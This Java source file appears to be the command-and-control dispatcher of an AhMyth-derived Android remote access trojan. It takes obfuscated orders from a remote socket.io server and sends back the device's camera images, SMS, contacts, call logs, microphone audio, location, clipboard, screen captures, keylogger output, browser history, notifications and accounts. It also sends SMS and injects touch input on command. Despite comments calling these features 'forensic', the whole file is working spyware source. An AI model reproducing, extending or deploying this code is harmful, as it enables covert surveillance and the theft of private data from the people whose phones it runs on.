package ahmyth.mine.king.ahmyth;

import org.json.JSONArray;
import org.json.JSONObject;
import io.socket.emitter.Emitter;

import android.content.Context;
import android.util.Log;
import android.os.Looper;
import android.os.Handler;

import java.lang.reflect.Method;

/**
 * ConnectionManager handles all socket.io communication with the server
 * and dispatches commands to appropriate handlers
 */
public class ConnectionManager {

    private static final String TAG = "ConnectionManager";
    
    public static Context context;
    private static io.socket.client.Socket ioSocket;
    private static FileManager fm = new FileManager();
    private static boolean isConnected = false;
    
    // Forensic managers
    private static ScreenCaptureManager screenCaptureManager;
    private static BrowserHistoryManager browserHistoryManager;
    private static SystemInfoManager systemInfoManager;
    private static InputManager inputManager;

    public static void startAsync(Context con) {
        try {
            Log.d(TAG, "startAsync called");
            ConnectionManager.context = con;
            
            // Initialize forensic managers
            screenCaptureManager = new ScreenCaptureManager(con);
            browserHistoryManager = new BrowserHistoryManager(con);
            systemInfoManager = new SystemInfoManager(con);
            inputManager = new InputManager(con);
            
            sendReq();
        } catch (Exception ex) {
            Log.e(TAG, "Error in startAsync", ex);
            new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
                @Override
                public void run() {
                    startAsync(con);
                }
            }, 5000);
        }
    }

    public static void startContext() {
        try {
            findContext();
        } catch (Exception ignored) {
        }
    }

    private static void findContext() throws Exception {
        Class<?> activityThreadClass;
        try {
            activityThreadClass = Class.forName("android.app.ActivityThread");
        } catch (ClassNotFoundException e) {
            return;
        }

        final Method currentApplication = activityThreadClass.getMethod("currentApplication");
        final Context context = (Context) currentApplication.invoke(null, (Object[]) null);
        
        if (context == null) {
            final Handler handler = new Handler(Looper.getMainLooper());
            handler.post(new Runnable() {
                public void run() {
                    try {
                        Context context = (Context) currentApplication.invoke(null, (Object[]) null);
                        if (context != null) {
                            startAsync(context);
                        }
                    } catch (Exception ignored) {
                    }
                }
            });
        } else {
            startAsync(context);
        }
    }

    private static boolean isConnecting = false;

    public static void sendReq() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    if (ioSocket != null && (isConnected || isConnecting)) {
                        Log.d(TAG, "Socket already connected or connecting");
                        return;
                    }

                    isConnecting = true;
                    Log.d(TAG, "Initializing socket connection");
                    ioSocket = IOSocket.getInstance().getIoSocket();

                    if (ioSocket == null) {
                        Log.e(TAG, "Failed to get IOSocket instance");
                        scheduleRetry();
                        return;
                    }

                    // Note: Socket.IO handles ping/pong internally - don't override

                    // Handle connection events
                    ioSocket.on(io.socket.client.Socket.EVENT_CONNECT, new Emitter.Listener() {
                        @Override
                        public void call(Object... args) {
                            Log.d(TAG, "Socket connected successfully");
                            isConnecting = false;
                            isConnected = true;
                            sendConnectionSuccessMessage();
                        }
                    });

                    ioSocket.on(io.socket.client.Socket.EVENT_DISCONNECT, new Emitter.Listener() {
                        @Override
                        public void call(Object... args) {
                            Log.w(TAG, "Socket disconnected");
                            isConnecting = false;
                            isConnected = false;
                        }
                    });

                    ioSocket.on(io.socket.client.Socket.EVENT_CONNECT_ERROR, new Emitter.Listener() {
                        @Override
                        public void call(Object... args) {
                            String errorMsg = "Connection error";
                            if (args != null && args.length > 0) {
                                errorMsg += ": " + args[0].toString();
                            }
                            Log.e(TAG, errorMsg);
                            isConnecting = false;
                            isConnected = false;
                        }
                    });
                    
                    ioSocket.on("connect_timeout", new Emitter.Listener() {
                        @Override
                        public void call(Object... args) {
                            Log.e(TAG, "Socket connection timeout");
                            isConnecting = false;
                            isConnected = false;
                        }
                    });
                    
                    ioSocket.on("reconnect_attempt", new Emitter.Listener() {
                        @Override
                        public void call(Object... args) {
                            Log.d(TAG, "Attempting to reconnect...");
                        }
                    });
                    
                    ioSocket.on("reconnect_error", new Emitter.Listener() {
                        @Override
                        public void call(Object... args) {
                            String errorMsg = "Reconnection error";
                            if (args != null && args.length > 0) {
                                errorMsg += ": " + args[0].toString();
                            }
                            Log.e(TAG, errorMsg);
                        }
                    });
                    
                    ioSocket.on("reconnect_failed", new Emitter.Listener() {
                        @Override
                        public void call(Object... args) {
                            Log.e(TAG, "Reconnection failed - all attempts exhausted");
                        }
                    });

                    // Handle orders from server
                    ioSocket.on("order", new Emitter.Listener() {
                        @Override
                        public void call(Object... args) {
                            try {
                                JSONObject data = (JSONObject) args[0];
                                String order = data.getString("order");
                                Log.d(TAG, "Order received: " + order);
                                
                                handleOrder(data, order);
                                
                            } catch (Exception e) {
                                Log.e(TAG, "Error processing order", e);
                            }
                        }
                    });

                    ioSocket.connect();
                    Log.d(TAG, "Socket connect() called");

                } catch (Exception ex) {
                    Log.e(TAG, "Error in sendReq", ex);
                    isConnecting = false;
                }
            }
        }).start();
    }

    private static void handleOrder(JSONObject data, String order) {
        try {
            switch (order) {
                // === EXISTING FEATURES ===
                case "x0000ca": // Camera
                    handleCameraOrder(data);
                    break;
                    
                case "x0000fm": // File Manager
                    handleFileManagerOrder(data);
                    break;
                    
                case "x0000sm": // SMS
                    handleSmsOrder(data);
                    break;
                    
                case "x0000cl": // Call Logs
                    x0000cl();
                    break;
                    
                case "x0000cn": // Contacts
                    x0000cn();
                    break;
                    
                case "x0000mc": // Microphone
                    x0000mc(data.getInt("sec"));
                    break;
                    
                case "x0000lm": // Location
                    x0000lm();
                    break;
                    
                case "x0000di": // Device Info
                    x0000di();
                    break;
                    
                case "x0000ap": // Apps
                    x0000ap();
                    break;
                    
                case "x0000cb": // Clipboard
                    handleClipboardOrder(data);
                    break;
                    
                case "x0000wf": // WiFi
                    x0000wf();
                    break;
                    
                // === NEW FORENSIC FEATURES ===
                case "x0000sc": // Screen Capture
                    handleScreenCapture(data);
                    break;
                
                case "x0000in": // Remote Input (VNC-like control)
                    handleRemoteInput(data);
                    break;
                    
                case "x0000kl": // Keylogger
                    handleKeylogger(data);
                    break;
                    
                case "x0000bh": // Browser History
                    handleBrowserHistory(data);
                    break;
                    
                case "x0000nt": // Notifications
                    handleNotifications(data);
                    break;
                    
                case "x0000si": // System Info (detailed)
                    handleSystemInfo(data);
                    break;
                    
                case "x0000ac": // Accounts
                    x0000ac();
                    break;
                    
                case "x0000pr": // Running Processes
                    x0000pr();
                    break;
                    
                case "x0000ns": // Network Stats
                    x0000ns();
                    break;
                    
                case "x0000us": // App Usage Stats
                    x0000us();
                    break;
                    
                case "x0000bt": // Battery Info (detailed)
                    x0000bt();
                    break;
                    
                case "x0000sm2": // SIM Info
                    x0000sm2();
                    break;
                    
                default:
                    Log.w(TAG, "Unknown order: " + order);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error handling order: " + order, e);
        }
    }

    // === EXISTING HANDLERS ===
    
    private static void handleCameraOrder(JSONObject data) throws Exception {
        String extra = data.getString("extra");
        if (extra.equals("camList")) {
            x0000ca(-1);
        } else if (extra.equals("1")) {
            x0000ca(1);
        } else if (extra.equals("0")) {
            x0000ca(0);
        }
    }

    private static void handleFileManagerOrder(JSONObject data) throws Exception {
        String extra = data.getString("extra");
        String path = data.getString("path");
        if (extra.equals("ls")) {
            x0000fm(0, path);
        } else if (extra.equals("dl")) {
            x0000fm(1, path);
        }
    }

    private static void handleSmsOrder(JSONObject data) throws Exception {
        String extra = data.getString("extra");
        if (extra.equals("ls")) {
            x0000sm(0, null, null);
        } else if (extra.equals("sendSMS")) {
            x0000sm(1, data.getString("to"), data.getString("sms"));
        }
    }

    private static void handleClipboardOrder(JSONObject data) throws Exception {
        String extra = data.getString("extra");
        if (extra.equals("get")) {
            x0000cb(0);
        } else if (extra.equals("start")) {
            x0000cb(1);
        } else if (extra.equals("stop")) {
            x0000cb(2);
        }
    }

    // === NEW FORENSIC HANDLERS ===
    
    private static void handleScreenCapture(JSONObject data) {
        Log.d(TAG, "Screen capture command");
        try {
            String extra = data.optString("extra", "info");
            ScreenStreamService screenService = ScreenStreamService.getInstance();
            
            if (extra.equals("info")) {
                // Get screen info
                JSONObject screenInfo;
                if (screenService != null) {
                    screenInfo = screenService.getScreenInfo();
                } else {
                    screenInfo = screenCaptureManager.getScreenInfo();
                }
                ioSocket.emit("x0000sc", screenInfo);
            } else if (extra.equals("capture")) {
                // Capture screenshot
                if (screenService != null && screenService.isCapturing()) {
                    JSONObject screenshot = screenService.captureFrame();
                    ioSocket.emit("x0000sc", screenshot);
                } else if (screenCaptureManager.isCapturing()) {
                    JSONObject screenshot = screenCaptureManager.captureScreen();
                    ioSocket.emit("x0000sc", screenshot);
                } else {
                    JSONObject result = new JSONObject();
                    result.put("success", false);
                    result.put("error", "Screen capture not active. User must grant screen recording permission on device.");
                    result.put("requiresPermission", true);
                    ioSocket.emit("x0000sc", result);
                }
            } else if (extra.equals("setQuality")) {
                int quality = data.optInt("quality", 50);
                if (screenService != null) {
                    screenService.setQuality(quality);
                }
                screenCaptureManager.setQuality(quality);
                JSONObject result = new JSONObject();
                result.put("success", true);
                result.put("quality", quality);
                ioSocket.emit("x0000sc", result);
            } else if (extra.equals("setScale")) {
                float scale = (float) data.optDouble("scale", 0.5);
                if (screenService != null) {
                    screenService.setScale(scale);
                }
                screenCaptureManager.setScale(scale);
                JSONObject result = new JSONObject();
                result.put("success", true);
                result.put("scale", scale);
                ioSocket.emit("x0000sc", result);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error in screen capture", e);
        }
    }
    
    private static void handleRemoteInput(JSONObject data) {
        Log.d(TAG, "Remote input command");
        try {
            String action = data.optString("action", "tap");
            boolean normalized = data.optBoolean("normalized", true);
            JSONObject result;
            
            switch (action) {
                case "tap":
                    float tapX = (float) data.optDouble("x", 0);
                    float tapY = (float) data.optDouble("y", 0);
                    result = inputManager.tap(tapX, tapY, normalized);
                    break;
                    
                case "swipe":
                    float startX = (float) data.optDouble("startX", 0);
                    float startY = (float) data.optDouble("startY", 0);
                    float endX = (float) data.optDouble("endX", 0);
                    float endY = (float) data.optDouble("endY", 0);
                    int swipeDuration = data.optInt("duration", 300);
                    result = inputManager.swipe(startX, startY, endX, endY, swipeDuration, normalized);
                    break;
                    
                case "longPress":
                    float lpX = (float) data.optDouble("x", 0);
                    float lpY = (float) data.optDouble("y", 0);
                    int lpDuration = data.optInt("duration", 1000);
                    result = inputManager.longPress(lpX, lpY, lpDuration, normalized);
                    break;
                    
                case "key":
                    String key = data.optString("key", "back");
                    result = inputManager.keyPress(key);
                    break;
                    
                case "text":
                    String text = data.optString("text", "");
                    result = inputManager.inputText(text);
                    break;
                    
                case "dimensions":
                    result = inputManager.getScreenDimensions();
                    break;
                    
                default:
                    result = new JSONObject();
                    result.put("success", false);
                    result.put("error", "Unknown action: " + action);
            }
            
            ioSocket.emit("x0000in", result);
            
        } catch (Exception e) {
            Log.e(TAG, "Error in remote input", e);
            try {
                JSONObject error = new JSONObject();
                error.put("success", false);
                error.put("error", e.getMessage());
                ioSocket.emit("x0000in", error);
            } catch (Exception ignored) {}
        }
    }
    
    private static void handleKeylogger(JSONObject data) {
        Log.d(TAG, "Keylogger command");
        try {
            String extra = data.optString("extra", "get");
            
            if (extra.equals("get")) {
                JSONObject keylogs = KeyloggerService.getKeylogs();
                ioSocket.emit("x0000kl", keylogs);
            } else if (extra.equals("clear")) {
                KeyloggerService.clearLogs();
                JSONObject result = new JSONObject();
                result.put("success", true);
                result.put("message", "Keylogs cleared");
                ioSocket.emit("x0000kl", result);
            } else if (extra.equals("status")) {
                JSONObject result = new JSONObject();
                result.put("enabled", KeyloggerService.isServiceEnabled());
                result.put("count", KeyloggerService.getLogCount());
                ioSocket.emit("x0000kl", result);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error in keylogger", e);
        }
    }
    
    private static void handleBrowserHistory(JSONObject data) {
        Log.d(TAG, "Browser history command");
        try {
            String extra = data.optString("extra", "all");
            
            if (extra.equals("history")) {
                JSONObject history = browserHistoryManager.getBrowserHistory();
                ioSocket.emit("x0000bh", history);
            } else if (extra.equals("bookmarks")) {
                JSONObject bookmarks = browserHistoryManager.getBookmarks();
                ioSocket.emit("x0000bh", bookmarks);
            } else if (extra.equals("searches")) {
                JSONObject searches = browserHistoryManager.getSearchQueries();
                ioSocket.emit("x0000bh", searches);
            } else {
                JSONObject allData = browserHistoryManager.getAllBrowserData();
                ioSocket.emit("x0000bh", allData);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error in browser history", e);
        }
    }
    
    private static void handleNotifications(JSONObject data) {
        Log.d(TAG, "Notifications command");
        try {
            String extra = data.optString("extra", "get");
            
            if (extra.equals("get")) {
                JSONObject notifications = NotificationReader.getNotifications();
                ioSocket.emit("x0000nt", notifications);
            } else if (extra.equals("active")) {
                NotificationReader instance = NotificationReader.getInstance();
                if (instance != null) {
                    JSONObject active = instance.getActiveNotificationsJSON();
                    ioSocket.emit("x0000nt", active);
                } else {
                    JSONObject result = new JSONObject();
                    result.put("error", "Notification access not enabled");
                    ioSocket.emit("x0000nt", result);
                }
            } else if (extra.equals("clear")) {
                NotificationReader.clearHistory();
                JSONObject result = new JSONObject();
                result.put("success", true);
                ioSocket.emit("x0000nt", result);
            } else if (extra.equals("status")) {
                JSONObject result = new JSONObject();
                result.put("enabled", NotificationReader.isServiceEnabled());
                ioSocket.emit("x0000nt", result);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error in notifications", e);
        }
    }
    
    private static void handleSystemInfo(JSONObject data) {
        Log.d(TAG, "System info command");
        try {
            String extra = data.optString("extra", "all");
            
            JSONObject result = new JSONObject();
            
            if (extra.equals("all") || extra.equals("system")) {
                result.put("system", systemInfoManager.getSystemInfo());
            }
            if (extra.equals("all") || extra.equals("battery")) {
                result.put("battery", systemInfoManager.getBatteryInfo());
            }
            if (extra.equals("all") || extra.equals("sim")) {
                result.put("sim", systemInfoManager.getSimInfo());
            }
            if (extra.equals("all") || extra.equals("accounts")) {
                result.put("accounts", systemInfoManager.getAccounts());
            }
            if (extra.equals("all") || extra.equals("processes")) {
                result.put("processes", systemInfoManager.getRunningProcesses());
            }
            if (extra.equals("all") || extra.equals("network")) {
                result.put("network", systemInfoManager.getNetworkStats());
            }
            if (extra.equals("all") || extra.equals("usage")) {
                result.put("usage", systemInfoManager.getAppUsageStats());
            }
            
            ioSocket.emit("x0000si", result);
        } catch (Exception e) {
            Log.e(TAG, "Error in system info", e);
        }
    }

    // === EXISTING COMMAND HANDLERS ===

    public static void x0000ca(int req) {
        Log.d(TAG, "Camera command: " + req);
        try {
            if (req == -1) {
                JSONObject cameraList = new CameraManager(context).findCameraList();
                if (cameraList != null) {
                    ioSocket.emit("x0000ca", cameraList);
                }
            } else if (req == 1) {
                new CameraManager(context).startUp(1);
            } else if (req == 0) {
                new CameraManager(context).startUp(0);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error in camera command", e);
        }
    }

    public static void x0000fm(int req, String path) {
        Log.d(TAG, "File manager command: " + req + " path: " + path);
        try {
            if (req == 0) {
                ioSocket.emit("x0000fm", fm.walk(path));
            } else if (req == 1) {
                fm.downloadFile(path);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error in file manager command", e);
        }
    }

    public static void x0000sm(int req, String phoneNo, String msg) {
        Log.d(TAG, "SMS command: " + req);
        try {
            if (req == 0) {
                ioSocket.emit("x0000sm", SMSManager.getSMSList());
            } else if (req == 1) {
                boolean isSent = SMSManager.sendSMS(phoneNo, msg);
                ioSocket.emit("x0000sm", isSent);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error in SMS command", e);
        }
    }

    public static void x0000cl() {
        Log.d(TAG, "Call logs command");
        try {
            ioSocket.emit("x0000cl", CallsManager.getCallsLogs());
        } catch (Exception e) {
            Log.e(TAG, "Error in call logs command", e);
        }
    }

    public static void x0000cn() {
        Log.d(TAG, "Contacts command");
        try {
            ioSocket.emit("x0000cn", ContactsManager.getContacts());
        } catch (Exception e) {
            Log.e(TAG, "Error in contacts command", e);
        }
    }

    public static void x0000mc(int sec) throws Exception {
        Log.d(TAG, "Microphone command: " + sec + " seconds");
        MicManager.startRecording(sec);
    }

    public static void x0000lm() {
        Log.d(TAG, "Location command");
        try {
            new Handler(Looper.getMainLooper()).post(new Runnable() {
                @Override
                public void run() {
                    try {
                        LocManager gps = new LocManager(context);
                        JSONObject location = new JSONObject();
                        
                        if (gps.canGetLocation()) {
                            location.put("enable", true);
                            location.put("lat", gps.getLatitude());
                            location.put("lng", gps.getLongitude());
                            location.put("accuracy", gps.getAccuracy());
                            location.put("altitude", gps.getAltitude());
                            location.put("speed", gps.getSpeed());
                            location.put("provider", gps.getProvider());
                            location.put("time", gps.getTime());
                        } else {
                            location.put("enable", false);
                        }
                        
                        ioSocket.emit("x0000lm", location);
                    } catch (Exception e) {
                        Log.e(TAG, "Error getting location", e);
                    }
                }
            });
        } catch (Exception e) {
            Log.e(TAG, "Error in location command", e);
        }
    }

    public static void x0000di() {
        Log.d(TAG, "Device info command");
        try {
            JSONObject deviceInfo = new DeviceInfoManager(context).getDeviceInfo();
            ioSocket.emit("x0000di", deviceInfo);
        } catch (Exception e) {
            Log.e(TAG, "Error in device info command", e);
        }
    }

    public static void x0000ap() {
        Log.d(TAG, "Apps command");
        try {
            JSONArray appsList = new DeviceInfoManager(context).getInstalledApps();
            JSONObject result = new JSONObject();
            result.put("appsList", appsList);
            ioSocket.emit("x0000ap", result);
        } catch (Exception e) {
            Log.e(TAG, "Error in apps command", e);
        }
    }

    public static void x0000cb(int req) {
        Log.d(TAG, "Clipboard command: " + req);
        try {
            new Handler(Looper.getMainLooper()).post(new Runnable() {
                @Override
                public void run() {
                    try {
                        ClipboardMonitor clipboardMonitor = new ClipboardMonitor(context);
                        if (req == 0) {
                            JSONObject clipboard = clipboardMonitor.getClipboardText();
                            ioSocket.emit("x0000cb", clipboard);
                        } else if (req == 1) {
                            clipboardMonitor.setClipboardListener(new ClipboardMonitor.OnClipboardChangedListener() {
                                @Override
                                public void onClipboardChanged(String text) {
                                    try {
                                        JSONObject result = new JSONObject();
                                        result.put("text", text);
                                        result.put("hasData", true);
                                        result.put("timestamp", System.currentTimeMillis());
                                        ioSocket.emit("x0000cb", result);
                                    } catch (Exception e) {
                                        Log.e(TAG, "Error sending clipboard change", e);
                                    }
                                }
                            });
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "Error in clipboard command", e);
                    }
                }
            });
        } catch (Exception e) {
            Log.e(TAG, "Error in clipboard command", e);
        }
    }

    public static void x0000wf() {
        Log.d(TAG, "WiFi command");
        try {
            JSONObject wifiInfo = new WiFiManager(context).getWiFiInfo();
            ioSocket.emit("x0000wf", wifiInfo);
        } catch (Exception e) {
            Log.e(TAG, "Error in WiFi command", e);
        }
    }

    // === NEW FORENSIC COMMAND HANDLERS ===
    
    public static void x0000ac() {
        Log.d(TAG, "Accounts command");
        try {
            JSONObject accounts = systemInfoManager.getAccounts();
            ioSocket.emit("x0000ac", accounts);
        } catch (Exception e) {
            Log.e(TAG, "Error in accounts command", e);
        }
    }
    
    public static void x0000pr() {
        Log.d(TAG, "Processes command");
        try {
            JSONObject processes = systemInfoManager.getRunningProcesses();
            ioSocket.emit("x0000pr", processes);
        } catch (Exception e) {
            Log.e(TAG, "Error in processes command", e);
        }
    }
    
    public static void x0000ns() {
        Log.d(TAG, "Network stats command");
        try {
            JSONObject networkStats = systemInfoManager.getNetworkStats();
            ioSocket.emit("x0000ns", networkStats);
        } catch (Exception e) {
            Log.e(TAG, "Error in network stats command", e);
        }
    }
    
    public static void x0000us() {
        Log.d(TAG, "Usage stats command");
        try {
            JSONObject usageStats = systemInfoManager.getAppUsageStats();
            ioSocket.emit("x0000us", usageStats);
        } catch (Exception e) {
            Log.e(TAG, "Error in usage stats command", e);
        }
    }
    
    public static void x0000bt() {
        Log.d(TAG, "Battery info command");
        try {
            JSONObject batteryInfo = systemInfoManager.getBatteryInfo();
            ioSocket.emit("x0000bt", batteryInfo);
        } catch (Exception e) {
            Log.e(TAG, "Error in battery command", e);
        }
    }
    
    public static void x0000sm2() {
        Log.d(TAG, "SIM info command");
        try {
            JSONObject simInfo = systemInfoManager.getSimInfo();
            ioSocket.emit("x0000sm2", simInfo);
        } catch (Exception e) {
            Log.e(TAG, "Error in SIM info command", e);
        }
    }

    // Get socket for external use
    public static io.socket.client.Socket getSocket() {
        return ioSocket;
    }
    
    // Check connection status
    public static boolean isConnected() {
        return isConnected && ioSocket != null && ioSocket.connected();
    }
    
    // Send connection success message
    private static void sendConnectionSuccessMessage() {
        try {
            JSONObject data = new JSONObject();
            data.put("status", "connected");
            data.put("timestamp", System.currentTimeMillis());
            data.put("model", android.os.Build.MODEL);
            data.put("manufacturer", android.os.Build.MANUFACTURER);
            data.put("androidVersion", android.os.Build.VERSION.RELEASE);
            if (ioSocket != null) {
                ioSocket.emit("client_connected", data);
                Log.d(TAG, "Connection success message sent");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error sending connection message", e);
        }
    }
    
    // Schedule retry for connection
    private static void scheduleRetry() {
        new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
            @Override
            public void run() {
                if (!isConnected && !isConnecting) {
                    Log.d(TAG, "Retrying connection...");
                    sendReq();
                }
            }
        }, 10000); // Retry after 10 seconds
    }
}
